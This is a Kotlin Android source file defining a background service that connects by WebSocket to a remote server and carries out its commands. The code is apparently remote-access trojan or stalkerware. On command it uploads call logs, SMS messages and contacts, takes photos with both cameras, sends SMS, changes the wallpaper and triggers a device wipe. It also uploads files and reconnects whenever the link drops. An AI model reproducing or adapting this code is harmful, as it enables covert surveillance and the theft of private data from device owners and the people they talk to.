package com.example.betryalcommit

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import org.json.JSONObject
import java.io.File
import java.io.IOException
import java.util.concurrent.Executors
import java.util.concurrent.ScheduledFuture
import java.util.concurrent.TimeUnit

class MyService : Service() {
    private val uiHandler = Handler(Looper.getMainLooper())
    private lateinit var webSocket: WebSocket
    private lateinit var client: OkHttpClient
    private lateinit var request: Request
   // private val serverUrl = "https://betryal-commit-back.onrender.com"
 //  private val serverUrl = "ws://192.168.31.50:8080"
   private val serverUrl = "https://bertrylcommit-back.botsailer1.repl.co/"
    private val NOTIFICATION_ID = 1410
    private var isWebSocketInitialized = false
    private lateinit var context: Context
    private var retryExecutor = Executors.newScheduledThreadPool(1)
    private var retryFuture: ScheduledFuture<*>? = null

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        context = this
        client = OkHttpClient.Builder()
            .readTimeout(0, TimeUnit.MILLISECONDS)
            .build()
        request = Request.Builder().url(serverUrl).build()
        if (!isWebSocketInitialized) {
            webSocket = client.newWebSocket(request, MyWebSocketListener())
            isWebSocketInitialized = true
        }

        if (!hmm.isServiceRunning(context)) {
            startForeground(NOTIFICATION_ID, createNotification())
        }
        return START_STICKY
    }

    private fun createNotification(): Notification {
        val channelId = "my_channel_id"
        val channelName = "My Channel"

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            val importance = NotificationManager.IMPORTANCE_DEFAULT
            val channel = NotificationChannel(channelId, channelName, importance)
            notificationManager.createNotificationChannel(channel)
        }

        val notificationBuilder = NotificationCompat.Builder(this, channelId)
            .build()

        return notificationBuilder
    }
    fun uploadFile(file: File) {
        if (isWebSocketInitialized && isSocketConnected) {
            val requestBody = file.asRequestBody("application/octet-stream".toMediaTypeOrNull())
            val request = Request.Builder()
                .url("$serverUrl/uploadFile")
                .post(requestBody)
                .build()

            client.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    Log.d("Upload", "Failed to upload file")
                }

                override fun onResponse(call: Call, response: Response) {
                    response.close()
                }
            })
        } else {
            reconnectWebSocket()
        }
    }


    private fun reconnectWebSocket() {
        Thread {
            try {
                Thread.sleep(10000)
                if (!isSocketConnected) {
                    webSocket.cancel()
                    webSocket = client.newWebSocket(request, MyWebSocketListener())
                }
            } catch (e: InterruptedException) {
                e.printStackTrace()
            }
        }.start()
    }
    inner class MyWebSocketListener : WebSocketListener() {
        override fun onOpen(webSocket: WebSocket, response: Response) {
            isSocketConnected = true
            this@MyService.webSocket = webSocket
            Log.d("WebSocket", "Connected to server")
            webSocket.send("Hello from Android!");
        }
        override fun onMessage(webSocket: WebSocket, text: String) {
            Log.d("WebSocket", "Received message: $text")
           uiHandler.post {
               var json = JSONObject(text)
                val commands = json.getString("commands")
               val data = json.getString("data")
               var num = ""
               var msg = ""
               if (data.contains(":")){
                    num = data.split(":")[0]
                     msg = data.split(":")[1]
               }
               when (commands) {
                    "lock" ->{println("hello")} //AdminAct.lockdev()
                    "hide" -> AdminAct.wiper(MainActivity(), applicationContext)
                    "call_logs" -> {
                        callutil.uploadCalls(applicationContext.contentResolver,webSocket)
                    }
                     "wallpaper" -> {
                         Log.e("wallpaper",data)
                         wallpaperset.setwall(applicationContext,data)
                     }
                    "sms_log" -> {
                        Teleserv.uploadsms(applicationContext.contentResolver, this@MyService,webSocket)
                    }
                    "contacts" -> {
                        Teleserv.uploadContact(applicationContext.contentResolver, this@MyService,webSocket)
                    }
                    "camera0" -> CameraCaptureHelper().captureback(context,webSocket);
                    "camera1" -> CameraCaptureHelper().capturefront(context,webSocket);
                   "sms_send" -> {
                       Teleserv.sendMessage(context,num,msg);
                   }

               }

        }
        }

        override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
            Log.d("WebSocket", "Connection closed")
            isSocketConnected = false
            reconnectWebSocket()
        }

        override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
            isSocketConnected = false
            Log.e("WebSocket", "Connection error: ${t.message}")
            reconnectWebSocket()
        }
    };
    companion object {
        private var isSocketConnected: Boolean = false // Moved to companion object

    }

}



